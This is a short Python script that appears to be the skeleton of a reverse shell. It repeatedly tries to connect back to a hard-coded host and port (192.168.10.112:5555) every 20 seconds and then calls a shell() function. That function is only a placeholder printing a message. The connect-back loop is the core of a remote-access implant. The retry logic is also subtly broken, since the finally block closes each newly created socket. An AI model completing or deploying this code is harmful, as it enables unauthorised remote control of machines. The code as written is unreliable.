import socket
import time

def connection():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Initialize the socket
    while True:
        try:
            time.sleep(20)  # Wait before attempting to connect
            s.connect(('192.168.10.112', 5555))
            shell()  # Placeholder for the shell function
            break  # Exit loop after successful connection and shell execution
        except Exception as e:
            print(f"Failed to connect, retrying. Error: {e}")
            s.close()  # Close the previous socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Reinitialize the socket
        finally:
            s.close()  # Ensure the socket is closed if we break out of the loop

def shell():
    # Placeholder for whatever function you want to execute after connection
    print("Connected and executing shell")

connection()
